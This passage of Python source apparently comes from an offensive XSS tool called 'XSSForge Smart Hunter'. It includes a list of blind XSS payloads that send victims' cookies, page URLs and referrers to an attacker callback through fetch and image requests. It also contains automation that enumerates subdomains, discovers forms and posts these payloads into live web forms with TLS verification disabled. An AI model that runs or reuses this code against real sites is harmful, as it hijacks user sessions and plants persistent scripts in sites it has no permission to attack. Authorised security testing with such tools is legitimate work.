                if source_name != "inline" and source_name.startswith("http"):
                    # Extract filename from URL
                    import os
                    filename = os.path.basename(source_name.split("?")[0])
                    sink_description = f"{pattern_name} (in {filename})"

                sinks_found.append(DOMSink(
                    url=url,
                    sink_type=sink_description,
                    code_snippet=snippet,
                    source=source,
                    exploitable=exploitable,
                ))

    except Exception as e:
        if verbose:
            print(f"[ERROR] DOM XSS scan: {e}", file=sys.stderr)

    return sinks_found


# ============================================================================
# Blind XSS Payloads
# ============================================================================

def generate_blind_payloads(callback_url: str) -> list[str]:
    """Generate blind XSS payloads for stored XSS detection."""

    # Clean callback URL
    callback = callback_url.rstrip("/")

    payloads = [
        # Basic script injection
        f'"><script src={callback}></script>',
        f"'><script src={callback}></script>",
        f'<script src={callback}></script>',

        # Image-based (often bypasses filters)
        f'"><img src=x onerror="var s=document.createElement(\'script\');s.src=\'{callback}\';document.body.appendChild(s)">',
        f'<img src=x onerror=this.src="{callback}?c="+document.cookie>',

        # SVG-based
        f'<svg onload="fetch(\'{callback}?c=\'+document.cookie)">',
        f'"><svg/onload=fetch("{callback}?c="+document.cookie)>',

        # Polyglot for different contexts
        f'javascript:fetch("{callback}?c="+document.cookie)//',
        f'"onmouseover="fetch(\'{callback}?c=\'+document.cookie)"',

        # XSS Hunter style (with detailed info)
        f'''<script>
var i=new Image();
i.src="{callback}?c="+encodeURIComponent(document.cookie)+
"&u="+encodeURIComponent(location.href)+
"&r="+encodeURIComponent(document.referrer);
</script>'''.replace("\n", ""),

        # Iframe injection
        f'<iframe src="{callback}" style="display:none"></iframe>',

        # Event handlers for stored XSS
        f'" onfocus="fetch(\'{callback}?c=\'+document.cookie)" autofocus="',
        f"' onfocus='fetch(`{callback}?c=${{document.cookie}}`)' autofocus='",
    ]

    return payloads


# ============================================================================
# Smart Hunter Class
# ============================================================================

class SmartHunter:
    """
    Automated XSS hunting with advanced techniques.

    Features:
    1. Subdomain enumeration (find dev/staging)
    2. Form discovery and POST testing
    3. API endpoint discovery
    4. DOM XSS scanning
    5. Blind XSS injection
    """

    def __init__(
        self,
        timeout: float = 15.0,
        verbose: bool = False,
        blind_callback: str = "",
    ):
        self.timeout = timeout
        self.verbose = verbose
        self.blind_callback = blind_callback

    async def hunt(
        self,
        target: str,
        scan_subdomains: bool = True,
        scan_forms: bool = True,
        scan_api: bool = True,
        scan_dom: bool = True,
        inject_blind: bool = True,
    ) -> HuntResult:
        """
        Perform comprehensive XSS hunting.

        Args:
            target: Domain or URL to hunt
            scan_subdomains: Enumerate subdomains
            scan_forms: Discover and test forms
            scan_api: Discover API endpoints
            scan_dom: Scan for DOM XSS
            inject_blind: Inject blind XSS payloads
        """
        # Normalize target
        if not target.startswith("http"):
            domain = target
            base_url = f"https://{target}"
        else:
            parsed = urlparse(target)
            domain = parsed.netloc
            base_url = target

        result = HuntResult(domain=domain)

        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
        ) as client:

            # Step 1: Subdomain enumeration
            if scan_subdomains:
                if self.verbose:
                    print(f"\n[PHASE 1] Subdomain Enumeration", file=sys.stderr)
                result.subdomains = await enumerate_subdomains(client, domain, self.verbose)
                if self.verbose:
                    print(f"[RESULT] Found {len(result.subdomains)} subdomains", file=sys.stderr)

            # Collect all URLs to scan
            urls_to_scan = [base_url]
            for sub in result.subdomains[:10]:  # Limit subdomain scanning
                urls_to_scan.append(f"https://{sub}")

            # Step 2: Form Discovery
            if scan_forms:
                if self.verbose:
                    print(f"\n[PHASE 2] Form Discovery", file=sys.stderr)
                for url in urls_to_scan:
                    forms = await discover_forms(client, url, self.verbose)
                    result.forms.extend(forms)
                if self.verbose:
                    print(f"[RESULT] Found {len(result.forms)} forms", file=sys.stderr)

                # Step 2.5: Test forms for Stored XSS
                if result.forms:
                    if self.verbose:
                        print(f"\n[PHASE 2.5] Stored XSS Testing", file=sys.stderr)

                    for form in result.forms:
                        # Test forms with text inputs, prioritize those without explicit method
                        if form.has_text_input and (form.test_both_methods or form.method == "POST"):
                            stored_findings = await test_stored_xss(client, form, self.verbose)
                            for finding in stored_findings:
                                result.xss_findings.append(finding)

                    if self.verbose:
                        stored_count = len([f for f in result.xss_findings if f.get("type") == "stored_xss"])
                        print(f"[RESULT] Found {stored_count} stored XSS vulnerabilities", file=sys.stderr)

            # Step 3: API Endpoint Discovery
            if scan_api:
                if self.verbose:
                    print(f"\n[PHASE 3] API Endpoint Discovery", file=sys.stderr)
                for url in urls_to_scan:
                    apis = await discover_api_endpoints(client, url, self.verbose)
                    result.api_endpoints.extend(apis)
                if self.verbose:
                    print(f"[RESULT] Found {len(result.api_endpoints)} API endpoints", file=sys.stderr)

            # Step 4: DOM XSS Scanning
            if scan_dom:
                if self.verbose:
                    print(f"\n[PHASE 4] DOM XSS Scanning", file=sys.stderr)
                for url in urls_to_scan:
                    sinks = await scan_dom_xss(client, url, self.verbose)
                    result.dom_sinks.extend(sinks)
                if self.verbose:
                    print(f"[RESULT] Found {len(result.dom_sinks)} DOM sinks", file=sys.stderr)

            # Step 5: Blind XSS Injection
            if inject_blind and self.blind_callback and result.forms:
                if self.verbose:
                    print(f"\n[PHASE 5] Blind XSS Injection", file=sys.stderr)

                blind_payloads = generate_blind_payloads(self.blind_callback)
                injected = 0

                for form in result.forms:
                    if form.has_text_input and form.method == "POST":
                        # Inject blind payload into text fields
                        for payload in blind_payloads[:3]:  # Limit payloads per form
                            data = {}
                            for inp in form.inputs:
                                if inp["type"] in ("text", "textarea", "email", "search"):
                                    data[inp["name"]] = payload
                                elif inp["value"]:
                                    data[inp["name"]] = inp["value"]
                                else:
                                    data[inp["name"]] = "test"

                            try:
                                await client.post(form.action, data=data)
                                injected += 1
                                if self.verbose:
                                    print(f"[BLIND] Injected into {form.action}", file=sys.stderr)
                            except:
                                pass

                            await asyncio.sleep(0.5)  # Rate limit

                if self.verbose:
                    print(f"[RESULT] Injected {injected} blind XSS payloads", file=sys.stderr)

        return result


# ============================================================================
# CLI Functions
# ============================================================================

async def hunt_target(
    target: str,
    full: bool = False,
    forms: bool = False,
    api: bool = False,
    dom: bool = False,
    subdomains: bool = False,
    blind_callback: str = "",
    verbose: bool = False,
    output: str = "",
) -> HuntResult:
    """
    Hunt for XSS on a target.

    Args:
        target: Domain or URL
        full: Enable all features
        forms: Scan forms
        api: Scan API endpoints
        dom: Scan for DOM XSS
        subdomains: Enumerate subdomains
        blind_callback: URL for blind XSS callbacks
        verbose: Verbose output
        output: Output file path (JSON)
    """
    # Full mode enables everything
    if full:
        forms = api = dom = subdomains = True

    # Default to at least forms and DOM
    if not any([forms, api, dom, subdomains]):
        forms = dom = True

    hunter = SmartHunter(
        verbose=verbose,
        blind_callback=blind_callback,
    )

    result = await hunter.hunt(
        target=target,
        scan_subdomains=subdomains,
        scan_forms=forms,
        scan_api=api,
        scan_dom=dom,
        inject_blind=bool(blind_callback),
    )

    # Output results
    if output:
        with open(output, "w") as f:
            json.dump(result.to_dict(), f, indent=2)
        if verbose:
            print(f"\n[SAVED] Results saved to {output}", file=sys.stderr)

    return result


def print_hunt_summary(result: HuntResult):
    """Print hunt results summary."""
    print(f"""
╔═══════════════════════════════════════════════════════════════╗
║                  XSSForge Smart Hunt Results                  ║
╠═══════════════════════════════════════════════════════════════╣
║  Target: {result.domain:<52} ║
╠═══════════════════════════════════════════════════════════════╣
║  Subdomains Found:     {len(result.subdomains):<35} ║
║  Forms Discovered:     {len(result.forms):<35} ║
║  API Endpoints:        {len(result.api_endpoints):<35} ║
║  DOM XSS Sinks:        {len(result.dom_sinks):<35} ║
╚═══════════════════════════════════════════════════════════════╝
""")

    # Show high-value findings
    if result.subdomains:
        print("HIGH-VALUE SUBDOMAINS (dev/staging):")
        for sub in result.subdomains[:10]:
            if any(x in sub for x in ["dev", "stag", "test", "qa", "sandbox", "beta"]):
                print(f"  🎯 {sub}")

    if result.forms:
        print("\nFORMS WITH TEXT INPUT (test for stored XSS):")
        for form in result.forms[:5]:
            if form.has_text_input:
                print(f"  📝 {form.method} {form.action}")

    if result.dom_sinks:
        print("\nDOM XSS SINKS (WAF can't block!):")
        for sink in result.dom_sinks[:5]:
            if sink.exploitable:
                print(f"  ⚠️  {sink.source} -> {sink.sink_type}")

    if result.api_endpoints:
        print("\nAPI ENDPOINTS (often lack WAF rules):")
        for api in result.api_endpoints[:5]:
            print(f"  🔌 {api.url}")


# ============================================================================
# Main
# ============================================================================

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="XSSForge Smart Hunter")
    parser.add_argument("target", help="Domain or URL to hunt")
    parser.add_argument("--full", action="store_true", help="Enable all features")
    parser.add_argument("--forms", action="store_true", help="Discover forms")
    parser.add_argument("--api", action="store_true", help="Discover API endpoints")
    parser.add_argument("--dom", action="store_true", help="Scan for DOM XSS")
    parser.add_argument("--subdomains", action="store_true", help="Enumerate subdomains")
    parser.add_argument("-b", "--blind", help="Blind XSS callback URL")
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    result = asyncio.run(hunt_target(
        target=args.target,
        full=args.full,
        forms=args.forms,
        api=args.api,
        dom=args.dom,
        subdomains=args.subdomains,
        blind_callback=args.blind or "",
        verbose=args.verbose,
        output=args.output or "",
    ))

    print_hunt_summary(result)
